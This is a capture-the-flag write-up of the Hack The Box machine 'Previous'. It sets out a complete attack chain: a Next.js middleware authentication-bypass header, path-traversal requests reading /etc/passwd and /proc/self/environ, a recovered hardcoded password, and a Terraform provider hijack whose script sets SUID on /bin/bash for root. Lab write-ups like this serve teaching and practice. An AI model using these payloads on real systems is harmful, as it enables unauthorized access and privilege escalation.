# Hack The Box – Previous

**Platform:** Hack The Box
**Category:** Web → Auth Bypass → LFI → Source Code Disclosure → Credential Exposure → IaC Privilege Escalation
**Host:** Kali Linux

---

## Overview

Previous is a modern web-focused machine built around Next.js, NextAuth, and Terraform.
The attack chain abuses a middleware authentication bypass, which leads to an LFI vulnerability, full application source disclosure, credential recovery, and finally a Terraform provider hijacking to gain root.

This machine is a realistic example of how framework misconfigurations and DevOps tooling can be chained into full system compromise.

---

## Reconnaissance

Initial scanning revealed a minimal attack surface:

```bash
nmap previous.htb -A
```


Open services:

22/tcp – OpenSSH

80/tcp – nginx (PreviousJS application)

The web application immediately became the primary focus.

---

## Web Enumeration

Directory enumeration revealed multiple /api endpoints protected by authentication:

```bash
dirsearch -u http://previous.htb
```


Almost all /api/* paths redirected to:

```bash
/api/auth/signin
```


This strongly suggested the use of NextAuth for authentication.

---

## Authentication Bypass (CVE-2025-29927)

Research revealed a critical vulnerability in Next.js middleware handling:
CVE-2025-29927, which allows authentication bypass by abusing the internal middleware subrequest mechanism.

By adding the following HTTP header:

```bash
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```


Authentication checks were bypassed for internal API routes.

This shifted the attack from black-box to white-box enumeration.

---

## API Enumeration with Middleware Bypass

Using the bypass header, API endpoints were enumerated again:

```bash
dirsearch -u http://previous.htb/api \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```


One endpoint immediately stood out:

```bash
/api/download
```

---

## Parameter Discovery & LFI

Parameter fuzzing on /api/download revealed a functional parameter:

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' \
-w /usr/share/fuzzDicts/paramDict/AllParam.txt \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```


The parameter example returned different responses.

Testing confirmed Local File Inclusion:

```bash
curl 'http://previous.htb/api/download?example=../../../../etc/passwd' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```


LFI confirmed.

---

## Environment & Application Path Discovery

Using /proc/self/environ, the runtime context was extracted:

```bash
curl 'http://previous.htb/api/download?example=../../../../proc/self/environ' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```


Key findings:

Application root: /app

Runtime: Node.js / Next.js

Production environment

---

## Next.js Source Code Disclosure

With LFI confirmed, attention shifted to the .next build directory.

The routing configuration was extracted:

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json'
```


This revealed the critical API route:

```bash
/api/auth/[...nextauth]
```


The compiled authentication logic was then retrieved:

```bash
curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js'
```

---

## Hardcoded Credentials in NextAuth

Reviewing the source code revealed a CredentialsProvider configuration:

```bash
if (
  credentials?.username === "jeremy" &&
  credentials.password ===
    (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
)
```


This exposed:

username: jeremy

password: MyNameIsJeremyAndILovePancakes

Hardcoded fallback secrets in authentication logic are catastrophic.

---

## Initial Access

Using the recovered credentials:

```bash
ssh jeremy@previous.htb
```


A shell as jeremy was obtained and the user flag retrieved.

## Local Enumeration & Container Context

System inspection revealed:

Docker bridges

Isolated network interfaces

Web application running inside containers

This explained the previous filesystem layout and reinforced that Terraform was being used for orchestration.

---

## Sudo Privilege Enumeration

Checking sudo privileges:

```bash
sudo -l
```


Revealed:

```bash
(root) /usr/bin/terraform -chdir=/opt/examples apply
```


Key details:

!env_reset enabled

Environment variables are preserved

Terraform executed as root

This is a classic IaC privilege escalation vector.

---

## Terraform Configuration Analysis

Reviewing /opt/examples/main.tf:

```bash
required_providers {
  examples = {
    source = "previous.htb/terraform/examples"
  }
}
```


The provider source is custom and not from the official registry.

This opens the door for provider hijacking.

---

## Terraform Provider Hijacking (Root)

Terraform allows overriding provider paths using a CLI configuration file.

A malicious provider binary was created:

```bash
#!/bin/bash
chmod u+s /bin/bash
```


Configuration file:

```bash
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/privesc"
  }
  direct {}
}
```


Environment variable set:

```bash
export TF_CLI_CONFIG_FILE=/home/jeremy/privesc/dev.tfrc
```


Executing Terraform as root:

```bash
sudo /usr/bin/terraform -chdir=/opt/examples apply
```


The malicious provider executed with root privileges.

---

## Root Compromise

Verification:

```bash
ls -al /bin/bash
```


Confirmed SUID bit set.

Root shell obtained and root flag retrieved.
